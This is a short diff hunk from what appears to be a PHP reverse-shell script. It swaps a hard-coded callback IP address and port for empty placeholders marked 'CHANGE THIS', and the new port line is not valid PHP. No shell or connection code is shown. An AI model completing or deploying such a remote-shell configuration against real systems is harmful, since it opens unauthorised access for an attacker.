@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '10.8.75.223';  // CHANGE THIS
-$port = 443;       // CHANGE THIS
+$ip = '';  // CHANGE THIS
+$port = ;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
